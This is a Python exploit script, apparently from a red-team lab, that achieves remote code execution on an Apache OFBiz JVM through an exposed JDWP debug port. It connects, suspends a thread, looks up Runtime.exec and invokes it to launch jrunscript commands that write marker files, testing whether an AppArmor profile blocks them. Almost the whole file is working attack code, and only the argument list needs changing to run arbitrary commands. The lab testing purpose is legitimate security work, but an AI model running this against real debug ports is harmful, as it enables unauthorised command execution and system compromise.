# -*- coding: utf-8 -*-
"""RT5-F: JDWP-only RCE against OFBiz debug port 5005 (bound to 0.0.0.0 in the
   hardened compose.apparmor.yaml). No CVE, no deser, no web request involved.
   The JVM (pid 1, under aa-ofbiz) executes Runtime.exec(String[]) via JDWP
   invoke; the jrunscript child (ix-granted, JDK8/**) writes markers.

   Runs inside a helper container attached to multi-round-lab_ofbiz.
   Usage: python jdwp_pwn.py <ofbiz-ip> 5005
"""
import base64
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "172.23.0.2"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5005

TAG_STRING = 0x73
TAG_ARRAY = 0x5B


class JDWP(object):
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=20)
        self.s.sendall(b"JDWP-Handshake")
        hs = b""
        while len(hs) < 14:
            hs += self.s.recv(14 - len(hs))
        assert hs == b"JDWP-Handshake", hs
        self.ids = 0
        self.sizes = None

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.s.recv(n - len(buf))
            if not chunk:
                raise IOError("eof")
            buf += chunk
        return buf

    def cmd(self, cmdset, cmd, data=b""):
        self.ids += 1
        pid = self.ids
        pkt = struct.pack(">IIBBB", 11 + len(data), pid, 0, cmdset, cmd) + data
        self.s.sendall(pkt)
        while True:
            hdr = self._recv_exact(11)
            ln, rid, flags, err = struct.unpack(">IIBH", hdr)
            body = self._recv_exact(ln - 11) if ln > 11 else b""
            if rid == pid:
                if err != 0:
                    raise RuntimeError("JDWP error %d on cmdset %d cmd %d"
                                       % (err, cmdset, cmd))
                return body

    def idsz(self):
        b = self.cmd(1, 7)
        f = ">iiiii"  # fieldID, methodID, objectID, referenceTypeID, frameID
        sz = struct.unpack(f, b[:struct.calcsize(f)])
        self.sizes = sz
        return sz

    def s(self, text):
        raw = text.encode("utf-8")
        return struct.pack(">I", len(raw)) + raw

    def read_s(self, b, off=0):
        n = struct.unpack(">I", b[off:off + 4])[0]
        return b[off + 4:off + 4 + n].decode("utf-8"), off + 4 + n

    def create_string(self, text):
        b = self.cmd(1, 11, self.s(text))
        return b[:self.sizes[2]]  # stringID (objectID size)


def main():
    j = JDWP(HOST, PORT)
    sz = j.idsz()
    print("[+] handshake ok, idSizes:", sz)
    cls_sz = sz[3]   # referenceTypeID size
    obj_sz = sz[2]   # objectID size

    # a suspended thread for invocations
    body = j.cmd(1, 4)  # VirtualMachine AllThreads
    (cnt,) = struct.unpack(">i", body[:4])
    print("[+] AllThreads count:", cnt)
    tid = None
    for i in range(cnt):
        t = body[4 + i * obj_sz: 4 + (i + 1) * obj_sz]
        try:
            j.cmd(10, 2, t)  # ThreadReference Suspend
            tid = t
            break
        except RuntimeError as e:
            print("[i] thread %s suspend failed: %s" % (t.hex(), e))
    print("[+] suspended thread:", tid.hex())

    # java.lang.Runtime refType + method ids
    b = j.cmd(1, 2, j.s("Ljava/lang/Runtime;"))  # ClassesBySignature
    (cnt,) = struct.unpack(">i", b[:4])
    runtime_ref = b[4:4 + cls_sz]
    print("[+] Runtime refType:", runtime_ref.hex())

    b = j.cmd(2, 5, runtime_ref)  # ReferenceType Methods
    off = 0
    (n,) = struct.unpack(">i", b[off:off + 4]); off += 4
    mids = {}
    for _ in range(n):
        mid = b[off:off + sz[4]]; off += sz[4]
        name, off = j.read_s(b, off)
        sig, off = j.read_s(b, off)
        off += 4  # modBits
        mids[(name, sig)] = mid
    mid_getruntime = mids[("getRuntime", "()Ljava/lang/Runtime;")]
    mid_exec_array = mids[("exec", "([Ljava/lang/String;)Ljava/lang/Process;")]
    print("[+] method ids: getRuntime=%s exec(String[])=%s"
          % (mid_getruntime.hex(), mid_exec_array.hex()))

    # invoke Runtime.getRuntime()
    b = j.cmd(3, 3, runtime_ref + tid + mid_getruntime
              + struct.pack(">i", 0) + struct.pack(">i", 1))
    runtime_obj = b[:obj_sz]
    print("[+] Runtime object:", runtime_obj.hex())

    def new_string(t):
        return j.create_string(t)

    def string_array(items):
        b = j.cmd(1, 2, j.s("[Ljava/lang/String;"))  # ClassesBySignature
        (cnt,) = struct.unpack(">i", b[:4])
        arr_ref = b[4:4 + cls_sz]
        b = j.cmd(5, 1, arr_ref + struct.pack(">i", len(items)))  # NewInstance
        arr_id = b[:obj_sz]
        vals = b""
        for it in items:
            vals += bytes([TAG_STRING]) + new_string(it)
        j.cmd(6, 3, arr_id + struct.pack(">ii", 0, len(items)) + vals)  # SetValues
        return arr_id

    def exec_argv(argv):
        arr = string_array(argv)
        b = j.cmd(9, 6, runtime_obj + tid + runtime_ref + mid_exec_array
                  + struct.pack(">i", 1) + bytes([TAG_ARRAY]) + arr
                  + struct.pack(">i", 1))
        print("[+] exec returned (exc tag %s)" % (b[obj_sz:obj_sz + 1].hex(),))

    # 1) app-tree marker via jrunscript (exec-granted JDK tool)
    exec_argv(["/usr/local/openjdk-8/bin/jrunscript", "-e",
               "new java.io.FileOutputStream('/usr/src/apache-ofbiz/pwn_jdwp_marker')"
               ".write('rt5_jdwp'.getBytes())"])
    # 2) /tmp control (expect kernel DENY)
    exec_argv(["/usr/local/openjdk-8/bin/jrunscript", "-e",
               "new java.io.FileOutputStream('/tmp/pwn_jdwp_tmp')"
               ".write(120)"])

    j.cmd(10, 3, tid)  # Resume
    print("[+] done")


if __name__ == "__main__":
    main()
